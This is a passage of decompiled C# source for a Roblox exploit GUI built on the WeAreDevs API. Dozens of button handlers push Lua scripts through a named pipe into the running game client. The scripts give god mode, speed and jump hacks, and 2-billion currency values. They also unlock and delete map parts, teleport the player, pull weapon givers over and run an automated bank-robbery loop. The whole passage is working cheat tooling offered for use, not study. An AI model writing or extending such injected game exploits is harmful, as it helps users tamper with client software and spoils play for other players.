      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + " .Character.Humanoid.WalkSpeed = 150");
    }

    private void flatButton10_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + " .Character.Humanoid.JumpPower = 150");
    }

    private void flatButton9_Click_1(object sender, EventArgs e)
    {
      string text = this.richTextBox2.Text;
      NamedPipes.LuaPipe("game:GetService('Players'). " + text + " .Character.Humanoid.MaxHealth = 999999999 game:GetService('Players'). " + text + " .Character.Humanoid.Health = 999999999");
    }

    private void flatButton7_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=362575925' pe.VelocitySpread = 50");
    }

    private void flatButton4_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=127476787' pe.VelocitySpread = 50");
    }

    private void flatButton15_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=165299650' pe.VelocitySpread = 50");
    }

    private void flatButton14_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=67923760' pe.VelocitySpread = 50");
    }

    private void flatButton20_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("workspace.Gravity = 196");
    }

    private void flatButton19_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("workspace.Gravity = 20");
    }

    private void flatButton17_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + ".leaderstats.Money.Value = 2000000000");
    }

    private void flatButton16_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + ".leaderstats.Cash.Value = 2000000000");
    }

    private void flatButton25_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + ".leaderstats.Kills.Value = 2000000000");
    }

    private void flatButton24_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + ".leaderstats.Coins.Value = 2000000000");
    }

    private void flatButton23_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace. " + this.richTextBox2.Text + " .Torso.Anchored = true");
    }

    private void flatButton22_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace. " + this.richTextBox2.Text + " .Torso.Anchored = false");
    }

    private void flatButton21_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("Instance.new('SurfaceLight').Parent = game.Workspace");
    }

    private void flatButton30_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Lighting.TimeOfDay = '12:00:00'");
    }

    private void flatButton29_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Lighting.TimeOfDay = '00:00:00'");
    }

    private void flatButton28_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + " .Character.Humanoid.Sit = true");
    }

    private void flatButton27_Click_1(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Sorry you get kicked by server, atlease the server died");
      NamedPipes.LuaPipe("for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') then v.Locked = false end end");
    }

    private void flatButton3_Click(object sender, EventArgs e)
    {
    }

    private void flatButton31_Click(object sender, EventArgs e)
    {
    }

    private void flatButton32_Click(object sender, EventArgs e)
    {
    }

    private void flatButton38_Click(object sender, EventArgs e)
    {
    }

    private void flatButton39_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/channel/UCzhMpW3HAI1LcXzfWgTbxfQ");
    }

    private void flatButton41_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.youtube.com/channel/UCKNKK4k-amlsUr_Mw4spLlQ");
    }

    private void flatButton40_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Made by DanielNiewold\nMade also by Cryptonic\nUsing WeAreDevsAPI", "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void flatButton46_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.PlayerGui.MainGui.Nitro.Name = 'Nitr' game:GetService('Players').LocalPlayer.PlayerGui.ProductGui.Nitro:Destroy() b = Instance.new('Model', game:GetService('Players').LocalPlayer.PlayerGui.ProductGui) b.Name = 'Nitro'");
    }

    private void flatButton45_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer:FindFirstChildOfClass'PlayerGui'.MainGui.Ammo.MagSize.RobloxLocked = true");
    }

    private void flatButton44_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Workspace').Doors:ClearAllChildren()");
    }

    private void flatButton43_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.Character.Humanoid.MaxHealth = 999999999 game:GetService('Players').LocalPlayer.Character.Humanoid.Health = 999999999");
    }

    private void flatButton42_Click(object sender, EventArgs e)
    {
      if (this.isClickDeleteEnabled)
      {
        if (this.flatButton42.Text != "Alt Delete: On")
        {
          NamedPipes.LuaPipe("_G.iEnabledOrNot = true;");
          this.flatButton42.Text = "Alt Delete: On";
          this.isClickDeleteEnabled = true;
        }
        else
        {
          NamedPipes.LuaPipe("_G.iEnabledOrNot = false;");
          this.flatButton42.Text = "Alt Delete: Off";
          this.isClickDeleteEnabled = false;
        }
      }
      else
      {
        NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
        this.flatButton42.Text = "Alt Delete: On";
        this.isClickDeleteEnabled = true;
      }
    }

    private void flatButton51_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Workspace').Gravity = 196.2");
    }

    private void flatButton50_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Workspace').Gravity = 30");
    }

    private void flatButton49_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:GetService('Players').LocalPlayer.TeamValue.Value = 'Police'");
    }

    private void flatButton48_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("This function is semi unstable, sorry!");
      NamedPipes.LuaPipe("A = game:GetService('Players') B = game:GetService('Workspace') local hit = A.LocalPlayer.Character.HumanoidRootPart.Position a = Instance.new('Part', B) a.Anchored = true a.Position = A.LocalPlayer.Character.HumanoidRootPart.Position a.CanCollide = false for i, v in pairs(B.Givers:GetChildren()) do if v.Name == 'Station' then for a, b in pairs(v:GetChildren()) do if b:IsA('StringValue') then if b.Value == 'Pistol' then v.CFrame = CFrame.new(hit) end end end end end");
    }

    private void flatButton47_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local hit = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,-3) a = Instance.new('Part', game:GetService('Workspace')) a.Anchored = true a.Position = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,0,-3) a.CanCollide = false for i, v in pairs(game:GetService('Workspace').Givers:GetChildren()) do if v.Name == 'Glider' then for a, b in pairs(v:GetChildren()) do if b:IsA('StringValue') then if b.Value == 'Glider' then v.CFrame = CFrame.new(hit) end end end end end");
    }

    private void flatButton52_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("This feature is currently unavailable, check back in the next update.");
    }

    private void flatButton56_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-222.339157, 17.9125443, 1575.82336) + Vector3.new(1,0,0) end");
    }

    private void flatButton55_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(32.214, 2.67609, 818.648926) + Vector3.new(1,0,0) end");
    }

    private void flatButton54_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.325, 17.878, 1320.123) + Vector3.new(1,0,0) end");
    }

    private void flatButton53_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(736.232239, 38.1125107, 1130.04456) + Vector3.new(1,0,0) end");
    }

    private void flatButton61_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(245.938766, 17.6064777, 1372.15076) + Vector3.new(1,0,0) end");
    }

    private void flatButton60_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(144.794067, 17.6189003, 768.572693) + Vector3.new(1,0,0) end");
    }

    private void flatButton59_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1138.66, 18.009, -1430.01) + Vector3.new(1,0,0) end");
    }

    private void flatButton58_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(267.315552, 17.6180038, -1796.33093) + Vector3.new(1,0,0) end");
    }

    private void flatButton57_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1548.20093, 17.7475166, 701.546997) + Vector3.new(1,0,0) end");
    }

    private void flatButton62_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,50 do wait(.06) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService('Players'). " + this.richTextBox4.Text + " .Character.UpperTorso.Position) + Vector3.new(1,0,0) end");
    }

    private void flatButton33_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1352598614' harambe.TextureId = 'http://www.roblox.com/asset/?id=1352598620' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton81_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players. " + this.richTextBox2.Text + " .Character.Humanoid.HipHeight = 50");
    }

    private void flatButton80_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local player = game:GetService('Players'). " + this.richTextBox2.Text + " local Fire = Instance.new('Fire', player.Character.Torso) Fire.Size = 20 Fire.Color = Color3.new(90,1,1) Fire.SecondaryColor = Color3.new(90,1,1) Fire.Heat = -500");
    }

    private void flatButton79_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local player = game:GetService('Players'). " + this.richTextBox2.Text + " local Fire = Instance.new('Fire', player.Character.Torso) Fire.Size = 20 Fire.Color = Color3.new(1,90,1) Fire.SecondaryColor = Color3.new(1,90,1) Fire.Heat = -500");
    }

    private void flatButton78_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local player = game:GetService('Players'). " + this.richTextBox2.Text + " local Fire = Instance.new('Fire', player.Character.Torso) Fire.Size = 20 Fire.Color = Color3.new(1,1,90) Fire.SecondaryColor = Color3.new(1,1,90) Fire.Heat = -500");
    }

    private void flatButton73_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=9419831' harambe.TextureId = 'http://www.roblox.com/asset/?id=9419827' harambe.Scale = Vector3.new(6,6,6) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton36_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430084366' harambe.TextureId = 'http://www.roblox.com/asset/?id=430084373' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton34_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=575768728' harambe.TextureId = 'http://www.roblox.com/asset/?id=575768731' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton35_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=432493972' harambe.TextureId = 'http://www.roblox.com/asset/?id=432493995' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton37_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1166992738' harambe.TextureId = 'http://www.roblox.com/asset/?id=1166992753' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton67_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=692222322' harambe.TextureId = 'http://www.roblox.com/asset/?id=692222506' harambe.Scale = Vector3.new(.2,.2,.2) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton65_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430056568' harambe.TextureId = 'http://www.roblox.com/asset/?id=430056584' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton66_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1486685917' harambe.TextureId = 'http://www.roblox.com/asset/?id=430056584' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton64_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1025010369' harambe.TextureId = 'http://www.roblox.com/asset/?id=430056584' harambe.Scale = Vector3.new(.9,.9,.9) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton63_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=483879121' harambe.TextureId = 'http://www.roblox.com/asset/?id=483879160' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton72_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=441272372' harambe.TextureId = 'http://www.roblox.com/asset/?id=441272375' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton70_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=539419757' harambe.TextureId = 'http://www.roblox.com/asset/?id=539419799' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton71_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=1163838080' harambe.TextureId = 'http://www.roblox.com/asset/?id=1163838085' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton69_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=920726697' harambe.TextureId = 'http://www.roblox.com/asset/?id=539419799' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton68_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=442911048' harambe.TextureId = 'http://www.roblox.com/asset/?id=442911054' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton77_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=589709812' harambe.TextureId = 'http://www.roblox.com/asset/?id=589709925' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton75_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=894928822' harambe.TextureId = 'http://www.roblox.com/asset/?id=894928826' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton76_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=579271022' harambe.TextureId = 'http://www.roblox.com/asset/?id=579271029' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton74_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430345698' harambe.TextureId = 'http://www.roblox.com/asset/?id=430345777' harambe.Scale = Vector3.new(.7,.7,.7) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton82_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("function tp(...)\nlocal char = game:GetService(\"Players\").LocalPlayer.Character\ngame.Workspace.Gravity = 0\nlocal root = char.HumanoidRootPart\nlocal args = {...}\nfor i=0,1,0.05 do\nwait(0.111)\nroot.CFrame = root.CFrame:lerp(CFrame.new(unpack(args,1,3)), i)\nend\ngame.Workspace.Gravity = 196.2\nend\nwarn(\"Auto Rob V1.1 Loaded Made By TTULEYB\")\nlocal player = game:GetService(\"Players\").LocalPlayer\nlocal i = 1\nwhile i < 99999999 do\nlocal Bank = workspace:FindFirstChild(\"Banks\"):GetChildren()[1]\nlocal Info = Bank.Extra.Sign.Decal\nif Info.Transparency == 0 then\nprint(\"Bank is Closed\")\nwait(3)\nelse\nprint(\"Robbing The Bank\")\nprint(\"Robbery Started\")\ntp(19.7360458, 18.1664009, 840.456848)\nwait(3)\ntp(31, 1, 814)\nwait(1)\nprint(\"Getting Rich $$$\")\ntp(18.5183678, 5.36565, 804.49)\nwait(24)\nwait(50)\nprint(\"Escaping!\")\ntp(119, 100, 840)\nwait(10)\nend\nend");
    }

    private void flatStatusBar1_Click(object sender, EventArgs e)
    {
    }

    private void flatButton83_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=591111961' harambe.TextureId = 'http://www.roblox.com/asset/?id=575768731' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton84_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=113221356' harambe.TextureId = 'http://www.roblox.com/asset/?id=113221332' harambe.Scale = Vector3.new(.11,.11,.11) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton85_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=466864538' harambe.TextureId = 'http://www.roblox.com/asset/?id=301196468' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton36_Click_1(object sender, EventArgs e)
    {
    }

    private void richTextBox5_TextChanged(object sender, EventArgs e)
    {
    }

    private void flatButton86_Click(object sender, EventArgs e)
    {
    }

    private void flatButton97_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=576551165' pe.VelocitySpread = 50");
    }

    private void flatButton95_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=188717596' pe.VelocitySpread = 50");
    }

    private void flatButton96_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=873102260' pe.VelocitySpread = 50");
    }

    private void flatButton94_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1864419782' pe.VelocitySpread = 50");
    }

    private void flatButton93_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=403736906' pe.VelocitySpread = 50");
    }

    private void flatButton92_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1753156606' pe.VelocitySpread = 50");
    }

    private void flatButton90_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1864688767' pe.VelocitySpread = 50");
    }

    private void flatButton91_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1110543057' pe.VelocitySpread = 50");
    }

    private void flatButton89_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=540242335' pe.VelocitySpread = 50");
    }

    private void flatButton88_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=937038269' pe.VelocitySpread = 50");
    }

    private void flatButton87_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=1858385709' pe.VelocitySpread = 50");
    }

    private void flatButton86_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=59649508' pe.VelocitySpread = 50");
    }

    private void flatButton99_Click(object sender, EventArgs e)
    {
